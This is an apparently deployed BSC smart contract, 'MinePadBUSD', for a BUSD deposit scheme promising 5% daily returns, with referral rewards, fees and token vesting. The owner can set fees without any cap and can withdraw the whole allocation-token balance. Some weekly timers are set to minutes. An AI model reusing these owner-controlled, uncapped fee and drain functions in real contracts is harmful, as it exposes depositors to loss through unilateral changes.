/**
 *Submitted for verification at BscScan.com on 2022-08-22
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

interface IERC20 {

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns(uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}

library SafeMath {

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract Events {
    event UserDeposit(address indexed user, uint256 _amount, uint256 time);
    event claimed(address indexed user, uint256 _amount, uint256 time);
    event withdrawReward(address indexed user, uint256 _amount, uint256 time);
    event withdrawVesting(address indexed user, uint256 _amount, uint256 time);
    event updateAllocReward(address indexed user, uint256 _amount, uint256 time);
}

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract MinePadBUSD is Context, Ownable , ReentrancyGuard, Events {
    using SafeMath for uint256;
    uint256 private min = 50 ether;
    uint256 private max = 100000 ether;
    uint256 private roi = 5;
    uint256 private fee = 10;
    uint256 private withdraw_fee = 5;
    uint256 private ref_fee = 10;
    uint256 private alloc = 100;    
    uint256 private currentDistribution;
    uint256 private Max_reward_pool;

    address private immutable receive_deposit_fee;
    address private immutable receive_withdrawal_fee;
    IERC20 private immutable BusdInterface;
    IERC20 private immutable tokenAllocationInterface;
    address public tokenAdress;
    address public tokenAllocationAdress;

    bool private init = false;

    constructor(
        address _receive_dep_fee, 
        address _receive_wit_fee, 
        address _token, 
        address _token_allocat
    ) {
            receive_deposit_fee = _receive_dep_fee;
            receive_withdrawal_fee = _receive_wit_fee;
            tokenAdress = _token; 
            tokenAllocationAdress = _token_allocat;
            tokenAllocationInterface = IERC20(tokenAllocationAdress);
            BusdInterface = IERC20(tokenAdress);
    }

    struct period {
        uint256 t_period;
        uint256 p_period;
    }

    struct refferal_system {
        address ref_address;
        uint256 reward;
    }

    struct refferal_withdraw {
        address ref_address;
        uint256 totalWithdraw;
    }

    struct user_investment_details {
        address user_address;
        uint256 invested;
    }

    struct weeklyWithdraw {
        address user_address;
        uint256 startTime;
        uint256 deadline;
        uint256 when20Percent;
    }

    struct claimDaily {
        address user_address;
        uint256 startTime;
        uint256 deadline;
    }

    struct userWithdrawal {
        address user_address;
        uint256 amount;
    }

    struct userTotalWithdraw {
        address user_address;
        uint256 amount;
    }
     struct userTotalRewards {
        address user_address;
        uint256 amount;
    } 

    struct vestingTime {
        address user_address;
        uint8 claimCount;
        uint256[] vestingPeriod;
        uint256[] amountPerPeriod;
        uint256 nextClaimTime;
    }

    mapping(address => vestingTime) private _vesting;
    mapping(address => refferal_system) public refferal;
    mapping(address => user_investment_details) public investments;
    mapping(address => weeklyWithdraw) public weekly;
    mapping(address => claimDaily) public claimTime;
    mapping(address => userWithdrawal) public approvedWithdrawal;
    mapping(address => userTotalWithdraw) public totalWithdraw;
    mapping(address => userTotalRewards) public totalRewards; 
    mapping(address => refferal_withdraw) public refTotalWithdraw;
    period[] private Period;
    // invest function 
    function deposit(address _ref, uint256 _amount) public noReentrant  {
        require(init, "Not Started Yet");
        require(_amount>= min, "Cannot Deposit");
        require( _amount <= max, "Cannot Deposit");
       
        if(!checkAlready()){
            uint256 ref_fee_add = refFee(_amount);
            if(_ref != address(0) && _ref != msg.sender) {
                uint256 ref_last_balance = refferal[_ref].reward;
                uint256 totalRefFee = SafeMath.add(ref_fee_add,ref_last_balance);   
                refferal[_ref] = refferal_system(_ref,totalRefFee);
            }
            else {
                uint256 ref_last_balance = refferal[receive_withdrawal_fee].reward;
                uint256 totalRefFee = SafeMath.add(ref_fee_add,ref_last_balance);  
                refferal[receive_withdrawal_fee] = refferal_system(receive_withdrawal_fee,totalRefFee);
            }

            // investment details
            uint256 userLastInvestment = investments[msg.sender].invested;
            uint256 totalInvestment = SafeMath.add(userLastInvestment,_amount);
            investments[msg.sender] = user_investment_details(msg.sender,totalInvestment);

            // weekly withdraw 
            uint256 deadline_weekly = block.timestamp + 7 minutes;
            uint256 start_20_percent_count = block.timestamp + 10 minutes;

            weekly[msg.sender] = weeklyWithdraw(msg.sender,block.timestamp,deadline_weekly, start_20_percent_count);

            // Claim Setting
            uint256 claimTimeEnd = block.timestamp + 1 minutes;

            claimTime[msg.sender] = claimDaily(msg.sender,block.timestamp,claimTimeEnd);
                
            // fees 
            uint256 total_fee = depositFee(_amount);
            uint256 total_contract = SafeMath.sub(_amount,total_fee);
            BusdInterface.transferFrom(msg.sender,receive_deposit_fee,total_fee);
            BusdInterface.transferFrom(msg.sender,address(this),total_contract);
            if (currentDistribution < Max_reward_pool ) {
                _updateAllocations(_amount);
            }
            emit UserDeposit(msg.sender, _amount, block.timestamp);
        }
        else {
            uint256 ref_fee_add = refFee(_amount);
            if(_ref != address(0) && _ref != msg.sender) {
                uint256 ref_last_balance = refferal[_ref].reward;
                uint256 totalRefFee = SafeMath.add(ref_fee_add,ref_last_balance);   
                refferal[_ref] = refferal_system(_ref,totalRefFee);
            }
            else {
                uint256 ref_last_balance = refferal[receive_deposit_fee].reward;
                uint256 totalRefFee = SafeMath.add(ref_fee_add,ref_last_balance);  
                refferal[receive_deposit_fee] = refferal_system(receive_deposit_fee,totalRefFee);
            }

            // investment details
            uint256 userLastInvestment = investments[msg.sender].invested;
            uint256 totalInvestment = SafeMath.add(userLastInvestment,_amount);
            investments[msg.sender] = user_investment_details(msg.sender,totalInvestment);

        // fees 
            uint256 total_fee = depositFee(_amount);
            uint256 total_contract = SafeMath.sub(_amount,total_fee);
            BusdInterface.transferFrom(msg.sender,receive_deposit_fee,total_fee);
            BusdInterface.transferFrom(msg.sender,address(this),total_contract);
            if (currentDistribution < Max_reward_pool ) {
                _updateAllocations(_amount);
            }
            emit UserDeposit(msg.sender, _amount, block.timestamp);
        }
    }

    function _updateAllocations(uint256 _amount) internal {
        
        uint256 currentAllocate = allocationPoint(_amount);

        uint256 lent = Period.length;
        uint256[] memory arg = new uint256[](lent);
        uint256[] memory vesting_percent = new uint256[](lent);

        for (uint256 i; i < lent; ) {
            period memory _period = Period[i];
            vesting_percent[i] = _calculate(_amount, _period.p_period);
            arg[i] = SafeMath.add(_period.t_period, block.timestamp);
            unchecked {
                i++;
            }
        }
        _vesting[msg.sender] = vestingTime(msg.sender, 0, arg, vesting_percent, arg[0]);
        
        currentDistribution = SafeMath.add(currentDistribution, currentAllocate);
        emit updateAllocReward(msg.sender, _amount, block.timestamp);
    }

    function vesting(address account) external view returns(address _user, uint8 counts, uint256[] memory periods, uint256[] memory amounts, uint256 _nxtClaim) {
        vestingTime memory vest = _vesting[account];
        uint256 lent = vest.vestingPeriod.length;
        periods = new uint256[](lent);
        amounts = new uint256[](vest.amountPerPeriod.length);
        for(uint256 i; i < lent; ) {
            periods[i] = vest.vestingPeriod[i];
            amounts[i] = vest.amountPerPeriod[i];
            unchecked {
                i++;
            }
        }
        _user = vest.user_address;
        counts = vest.claimCount;
        _nxtClaim = vest.nextClaimTime;
    }

    function _calculate(uint256 _amount, uint256 _percent) internal pure returns(uint256) {
        uint256 get_multiplication = SafeMath.mul(_amount, _percent);
        return SafeMath.div(get_multiplication, (100));
    }

    function claimAllocationReward() external noReentrant {
        uint256 amountPerTime = _claimedCheck();

        require(tokenAllocationInterface.balanceOf(address(this)) > amountPerTime, "No More Reward.");
        uint256 wFee = withdrawFee(amountPerTime);

        uint256 totalAmountToWithdraw = SafeMath.sub(amountPerTime,wFee); // changed from aval_withdraw to aval_withdraw2

        tokenAllocationInterface.transfer(msg.sender,totalAmountToWithdraw);
        tokenAllocationInterface.transfer(receive_withdrawal_fee,wFee);
        emit withdrawVesting(msg.sender, totalAmountToWithdraw, block.timestamp);
    }

    function _claimedCheck() internal returns(uint256) {
        uint256 currentlyClaimed = _vesting[msg.sender].nextClaimTime;
        require(block.timestamp > currentlyClaimed, "Patience" );
        uint256 lent = _vesting[msg.sender].vestingPeriod.length;
        require(_vesting[msg.sender].claimCount <= lent, "Complete");
        uint256 amountPerTime;
        for (uint256 i; i < lent; ) {
            uint256 vestP = _vesting[msg.sender].vestingPeriod[i];
            if (vestP > currentlyClaimed) {
                _vesting[msg.sender].nextClaimTime = vestP;
                amountPerTime = _vesting[msg.sender].amountPerPeriod[i];
                unchecked {
                    _vesting[msg.sender].claimCount ++;
                }
                break;
            }
            unchecked {
                i ++;
            }
        }
        return amountPerTime;
    }

    function userReward(address _userAddress) public view returns(uint256) {        
        
        uint256 userInvestment = investments[_userAddress].invested;
        uint256 userDailyReturn = DailyRoi(userInvestment);

        // invested time

        uint256 claimInvestTime = claimTime[_userAddress].startTime;
        uint256 claimInvestEnd = claimTime[_userAddress].deadline;

        uint256 totalTime = SafeMath.sub(claimInvestEnd,claimInvestTime);

        uint256 value = SafeMath.div(userDailyReturn,totalTime);

        uint256 nowTime = block.timestamp;

        if(claimInvestEnd >= nowTime) {
            uint256 earned = SafeMath.sub(nowTime,claimInvestTime);

            uint256 totalEarned = SafeMath.mul(earned, value);

            return totalEarned;
        }
        else {
          
            return userDailyReturn;
        }
    }


    function withdrawal() public noReentrant {
        require(init, "Not Started Yet");    
        require(weekly[msg.sender].deadline <= block.timestamp, "You cant withdraw");
        require(totalRewards[msg.sender].amount <= SafeMath.mul(investments[msg.sender].invested,3), "You cant withdraw you have collected five times Already"); // hh new
        
        uint256 _start_20_percent = weekly[msg.sender].when20Percent;
        
        uint256 aval_withdraw = approvedWithdrawal[msg.sender].amount;
        uint256 aval_withdraw2;  

        if(block.timestamp > _start_20_percent) {
            aval_withdraw2 = SafeMath.div(SafeMath.mul(aval_withdraw, 25), 100); // divide the fees   
        } else {
            aval_withdraw2 = SafeMath.div(aval_withdraw,2); // divide the fees
        }
           
        uint256 wFee = withdrawFee(aval_withdraw2); // changed from aval_withdraw    
        uint256 totalAmountToWithdraw = SafeMath.sub(aval_withdraw2,wFee); // changed from aval_withdraw to aval_withdraw2

        BusdInterface.transfer(msg.sender,totalAmountToWithdraw);
        BusdInterface.transfer(receive_withdrawal_fee,wFee);

        approvedWithdrawal[msg.sender] = userWithdrawal(msg.sender,aval_withdraw2); // changed from 0 to half of the amount stay in in his contract

        uint256 weeklyStart = block.timestamp;
        uint256 deadline_weekly = block.timestamp + 7 minutes;

        weekly[msg.sender] = weeklyWithdraw(msg.sender,weeklyStart,deadline_weekly, _start_20_percent);

        uint256 amount = totalWithdraw[msg.sender].amount;

        uint256 totalAmount = SafeMath.add(amount,aval_withdraw2); // it will add one of his half to total withdraw

        totalWithdraw[msg.sender] = userTotalWithdraw(msg.sender,totalAmount);
        emit withdrawReward(msg.sender, totalAmountToWithdraw, block.timestamp);
    }
    
    function claimDailyRewards() public noReentrant{
        require(init, "Not Started Yet");
        require(claimTime[msg.sender].deadline <= block.timestamp, "You cant claim");

        uint256 rewards = userReward(msg.sender);

        uint256 currentApproved = approvedWithdrawal[msg.sender].amount;

        uint256 value = SafeMath.add(rewards,currentApproved);

        approvedWithdrawal[msg.sender] = userWithdrawal(msg.sender,value);
        uint256 amount = totalRewards[msg.sender].amount; //hhnew
        uint256 totalRewardAmount = SafeMath.add(amount,rewards); //hhnew
        totalRewards[msg.sender].amount = totalRewardAmount;

        uint256 claimTimeStart = block.timestamp;
        uint256 claimTimeEnd = block.timestamp + 1 days;

        claimTime[msg.sender] = claimDaily(msg.sender,claimTimeStart,claimTimeEnd);
        emit claimed(msg.sender, totalRewardAmount, block.timestamp);
    }

    function Ref_Withdraw() external noReentrant {
        require(init, "Not Started Yet");
        uint256 value = refferal[msg.sender].reward;

        BusdInterface.transfer(msg.sender,value);
        refferal[msg.sender] = refferal_system(msg.sender,0);

        uint256 lastWithdraw = refTotalWithdraw[msg.sender].totalWithdraw;

        uint256 totalValue = SafeMath.add(value,lastWithdraw);

        refTotalWithdraw[msg.sender] = refferal_withdraw(msg.sender,totalValue);
    }

    // initialized the market

    function signal_market(bool initStatus) public onlyOwner {
        init = initStatus;
    }

    function setFees(uint256 _w_fee, uint256 _d_fee) external onlyOwner {
        withdraw_fee = _w_fee;
        fee = _d_fee;
    }

    function setRefFee(uint256 _rf_fee) external onlyOwner {
        ref_fee = _rf_fee;
    }

    function setMin_MaxDeposit(uint256 _mini, uint256 _maxi) external onlyOwner {
        min = _mini;
        max = _maxi;
    }

    function setMaxRewardPool(uint256 _addToPoolReward) external onlyOwner {
        Max_reward_pool = SafeMath.add(Max_reward_pool,_addToPoolReward);
    }

    function setpriceAmount(uint256 _newAlloc) external onlyOwner {
        alloc = _newAlloc;
    }

    function setVestingPeriod(uint256[] calldata _period, uint256[] calldata _percent) external onlyOwner {
        require(_period.length == _percent.length, "Invalid");
        for (uint256 i; i < _period.length; ) {            
            Period.push(period(_period[i], _percent[i]));
            unchecked {
                i ++;
            }
        }
    }
    function ownerWithdrawToken() external onlyOwner {
        tokenAllocationInterface.transfer(owner(), tokenAllocationInterface.balanceOf(address(this)));
    }

    function DailyRoi(uint256 _amount) public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(_amount,roi),100);
    }
     function checkAlready() public view returns(bool) {
        if(investments[msg.sender].user_address == msg.sender){
            return true;
        }
        else{
            return false;
        }
    }

    function allocationPoint(uint256 _amount) public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(_amount, alloc), 100);
    }

    function depositFee(uint256 _amount) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(_amount,fee),100);
    }

    function refFee(uint256 _amount) public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(_amount,ref_fee),100);
    }

    function withdrawFee(uint256 _amount) public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(_amount,withdraw_fee),100);
    }

    function getBalance() public view returns(uint256){
         return BusdInterface.balanceOf(address(this));
    }

    function allocate() external view returns(uint256) {
        return alloc;
    }

    function _min() external view returns(uint256) {
        return min;
    }
    function _max() external view returns(uint256) {
        return max;
    }
    function _roi() external view returns(uint256) {
        return roi;
    }
    function _fee() external view returns(uint256) {
        return fee;
    }
    function _withdraw_fee() external view returns(uint256) {
        return withdraw_fee;
    }
    function _ref_fee() external view returns(uint256) {
        return ref_fee;
    }
    function _receive_deposit_fee() external view returns(address) {
        return receive_deposit_fee;
    }
    function _receive_withdrawal_fee() external view returns(address) {
        return receive_withdrawal_fee;
    }

    function _init() external view returns(bool) {
        return init;
    }

    function currentAmountDistributed() external view returns(uint256) {
        return currentDistribution;
    }

    function maxRewardPool() external view returns (uint256) {
        return Max_reward_pool;
    }

    function getVestingPeriod() external view returns(period[] memory _period) {
        uint256 lent = Period.length;
        _period = new period[](lent);
        for (uint256 i; i < lent; ) {
            _period[i] = Period[i];
            unchecked {
                i ++;
            }
        }
    }

}